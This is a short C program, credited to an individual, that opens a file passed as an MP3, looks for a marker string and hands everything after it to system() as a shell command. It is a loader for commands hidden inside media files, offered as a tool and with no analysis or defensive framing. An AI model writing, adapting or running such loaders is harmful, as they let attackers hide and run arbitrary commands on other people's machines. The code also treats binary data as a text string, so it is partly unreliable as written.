#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void execute_payload(char *data) {
    printf("Executing payload: %s\n", data);
    // Simulate execution of the payload
    system(data);
}

void read_mp3_file(const char *filename) {
    FILE *file = fopen(filename, "rb");
    if (file == NULL) {
        perror("Failed to open file");
        exit(EXIT_FAILURE);
    }

    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    fseek(file, 0, SEEK_SET);

    char *data = (char *)malloc(file_size);
    if (data == NULL) {
        perror("Failed to allocate memory");
        fclose(file);
        exit(EXIT_FAILURE);
    }

    fread(data, 1, file_size, file);
    fclose(file);

    // Locate the payload (for this example, we assume the payload is at the end of the file)
    char *payload = strstr(data, "your_payload_prefix");
    if (payload != NULL) {
        execute_payload(payload + strlen("your_payload_prefix"));
    } else {
        printf("No payload found in the MP3 file.\n");
    }

    free(data);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <mp3_file>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    read_mp3_file(argv[1]);
    return 0;
}

// Crediti a Jashin L.
